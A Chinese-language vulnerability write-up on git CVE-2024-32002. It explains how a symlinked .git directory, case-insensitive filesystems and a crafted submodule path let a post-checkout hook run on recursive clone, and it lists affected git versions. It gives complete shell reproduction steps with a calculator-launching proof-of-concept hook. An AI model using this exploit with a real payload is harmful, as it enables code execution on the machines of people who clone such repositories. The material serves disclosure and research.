# CVE-2024-32002
## 漏洞原理：
1. git clone操作完之后会触发post-checkout钩子，但是该钩子位于.git/hooks/post-checkout无法控制
2. 子模块能够通过设置path路径来向主仓库任意位置写入文件，而主仓库的.git/modules/{子模块name}/hooks/存放了子仓库的钩子文件，即我们可以通过子模块将主仓库用来记录子模块的.git下的目录进行hooks钩子写入
3. 出现问题：直接将.git作为子模块路径写入会push不到远程仓库（.git目录不会传到仓库去）
4. 解决方案：使用软链接将.git目录给链接出来，然后向该软链接写入hook钩子，并且子模块路径必须要和软链接路径不一致，该问题可以通过mac和windows对文件名大小写不敏感进行绕过
5. 又出现问题：直接写入该钩子不会触发rce，原因是主仓库目录下的link软链接和子模块路径LINK冲突，导致在clone主仓库的时候就以及将软链接覆盖掉了导致后续没有在软链接对应的目录下写文件而是在link实际目录下写入的hook文件
6. 解决方法：将子模块名分割成两个路径，即link和LINK/{任意目录名}，这样就能解决覆盖问题，至于多出来的这个{任意目录名}则可以直接在子模块path后面加上就能正确对应
## 漏洞复现
```
1. 创建子模块仓库：（https://github.com/pysnow1/hook）
git init hook
mkdir -p pysnow/hooks
echo "#!/bin/bash\nopen -a Calculator.app" > pysnow/hooks/post-checkout
git add pysnow/hooks/post-checkout
git commit -m "init hook"
git remote add origin git@github.com:pysnow1/hook.git
git push -u origin main

2. 创建rce触发仓库：（https://github.com/pysnow1/gitrce）
git init gitrce
ln -s .git l
git add l
git commit -m "init link"
git remote add origin git@github.com:pysnow1/gitrce.git
git push -u origin main
rm -rf l

git submodule add --name predir/pysnow https://github.com/pysnow1/hook L/modules/predir
git commit -m "init submodule"
git push

3. 触发漏洞：
git clone --recursive https://github.com/pysnow1/gitrce
```
## 漏洞影响版本
```
affected at = 2.45.0
affected at = 2.44.0
affected at >= 2.43.0, < 2.43.4
affected at >= 2.42.0, < 2.42.2
affected at = 2.41.0
affected at >= 2.40.0, < 2.40.2
affected at < 2.39.4
```
